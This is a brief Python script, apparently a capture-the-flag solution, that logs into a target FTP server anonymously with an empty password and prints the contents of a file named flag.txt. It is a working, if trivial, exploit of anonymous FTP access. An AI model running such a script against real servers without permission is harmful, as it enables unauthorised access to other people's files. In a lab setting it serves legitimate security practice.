#!/usr/bin/env python3

import ftplib
import sys

system = sys.argv[1]
ftp_port = 21

try:
    # Connect to the FTP Server
    ftp = ftplib.FTP()
    ftp.connect(system, ftp_port)

    # Login with user anonymous and empty password - found with nmap
    ftp.login(user="anonymous", passwd="")

    # retrieve flag.txt file and store its content
    flag_content = []
    ftp.retrlines("RETR flag.txt", flag_content.append)

    # print file contents
    print("\n".join(flag_content))

    # close connection
    ftp.quit()

except ftplib.all_errors as e:
    print(f"FTP error: {e}")